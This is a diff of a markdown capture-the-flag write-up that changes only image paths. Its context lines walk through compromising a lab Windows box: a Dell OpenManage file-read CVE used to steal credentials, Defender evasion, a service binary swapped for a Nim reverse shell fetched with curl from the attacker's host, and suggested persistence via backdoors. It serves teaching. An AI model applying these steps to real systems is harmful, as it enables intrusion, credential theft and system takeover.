@@ -110,19 +110,19 @@ Looks like a Windows machine and there are six ports open:
 
 Looking at the scan results shows Nmap's default scripts disclose that FTP is allowing for anonymous logins.
 
-![](../assets/img/2026-01-25-HackSmarterSecurity/1.png)
+![](/assets/img/2026-01-25-HackSmarterSecurity/1.png)
 
 Inside is a list of stolen credit cards and a PNG of another stolen passport (which is just Tyler's face lol). This doesn't really seem like much to help our goal for now so I move onto the web servers.
 
 Checking the landing page on port 80 returns a website for their hacking group which sponsors some less than ethical services.
 
-![](../assets/img/2026-01-25-HackSmarterSecurity/2.png)
+![](/assets/img/2026-01-25-HackSmarterSecurity/2.png)
 
 The page is static and the only real functionality on it is a contact form in order to reach them at. I fire up Gobuster to look for subdirectories/subdomains in the background.
 
 Capturing requests from the website show that the contact form goes nowhere. That pretty much confirms that this port is useless and I can move onto the SSL server on port 1311. Viewing the self-signed certificate only grants us a DNS alternate name for `hacksmartersec`.
 
-![](../assets/img/2026-01-25-HackSmarterSecurity/3.png)
+![](/assets/img/2026-01-25-HackSmarterSecurity/3.png)
 
 The actual page looks to be a DELL EMC OpenManage panel. I click on the About tab in the footer which discloses the version it's running on. Then, I start researching known vulnerabilities in this application with that info and find that [CVE-2020–5377](https://rhinosecuritylabs.com/research/cve-2020-5377-dell-openmanage-server-administrator-file-read/) allows for arbitrary file reading on this server.
 
@@ -131,7 +131,7 @@ This vulnerability exists due to a default setting in Dell's OpenManage Server A
 ## Initial Foothold
 I find a PoC for the rogue server listener [here](https://github.com/RhinoSecurityLabs/CVEs/blob/master/CVE-2020-5377_CVE-2021-21514/CVE-2020-5377.py?ref=benheater.com). To use it, we just need to setup the server, attempt a login on port 1311, and then we have persistent file read capabilities on the server.
 
-![](../assets/img/2026-01-25-HackSmarterSecurity/4.png)
+![](/assets/img/2026-01-25-HackSmarterSecurity/4.png)
 
 Now that we can read files from it, I need to choose what to read. I know there are probably credentials stored for the website and we found the application name in the certificate earlier. I end up checking the config file for the IIS server and grab credentials for a user named Tyler.
 
@@ -141,22 +141,22 @@ The default spot for web content on IIS is located in the inetpub dir, the hard 
 C:\inetpub\wwwroot\hacksmartersec\web.config
 ```
 
-![](../assets/img/2026-01-25-HackSmarterSecurity/5.png)
+![](/assets/img/2026-01-25-HackSmarterSecurity/5.png)
 
 We can now use these newfound creds to login via SSH to get a cmd.exe shell on the box, as well as grab the user flag under his Desktop folder.
 
-![](../assets/img/2026-01-25-HackSmarterSecurity/6.png)
+![](/assets/img/2026-01-25-HackSmarterSecurity/6.png)
 
 Next, I start looking at routes to get administrator access. Tyler doesn't have any special privileges to abuse nor are there non-standard folders that stand out to me. I try to upload WinPEAS to a Temp directory, but running it gets sniped by Windows Defender. We'll have to get creative.
 
 I enumerate the system manually a few times over but still have trouble finding anything remotely useful. I decide to upload different PrivEsc checker scripts until Windows Defender couldn't flag its fingerprint.
 
-![](../assets/img/2026-01-25-HackSmarterSecurity/7.png)
+![](/assets/img/2026-01-25-HackSmarterSecurity/7.png)
 
 ## Privilege Escalation
 Eventually, I find [PrivescCheck](https://github.com/itm4n/PrivescCheck/releases/download/2026.01.14-2/PrivescCheck.ps1) and run it to find any binary, process, or privilege to exploit. 
 
-![](../assets/img/2026-01-25-HackSmarterSecurity/8.png)
+![](/assets/img/2026-01-25-HackSmarterSecurity/8.png)
 
 I come back to a finding that an executable named `spoofer-scheduler` is highly vulnerable according to the script. This binary is allowed to be ran by any user but is actually ran under the `LocalSystem`. If we replace this programs `.exe` with our own reverse shell or malicious payload, we can escalate privileges to admin.
 
@@ -172,7 +172,7 @@ sudo apt install nim
 
 Then I change the IP and port lines within the script to point towards my netcat listener. I chose port 80 for my reverse shell as we already know that port is not being filtered by Antivirus. 
 
-![](../assets/img/2026-01-25-HackSmarterSecurity/9.png)
+![](/assets/img/2026-01-25-HackSmarterSecurity/9.png)
 
 Then, I compile the code using Nim as mentioned in the GitHub repo, making sure that it has the same name as our binary to be replaced.
 
@@ -207,11 +207,11 @@ curl http://MACHINE_IP/spoofer-scheduler.exe -o spoofer-scheduler.exe
 
 Final step is to setup a netcat listener on port 80 and start the service back up to get a shell as `NT AUTHORITY\SYSTEM`.
 
-![](../assets/img/2026-01-25-HackSmarterSecurity/10.png)
+![](/assets/img/2026-01-25-HackSmarterSecurity/10.png)
 
 Due to how the service manager works, if the program doesn't respond in a timely fashion it will get terminated. However, we still have a few seconds to run commands on the system which is more than enough to grab the list of targets and complete the box.
 
-![](../assets/img/2026-01-25-HackSmarterSecurity/11.png)
+![](/assets/img/2026-01-25-HackSmarterSecurity/11.png)
 
 For persistence, we could add a backdoor binary of some kind or even a rogue user account to maintain access to their systems. This box was very well done so props to Tyler and the Hack Smarter team for making it.
 
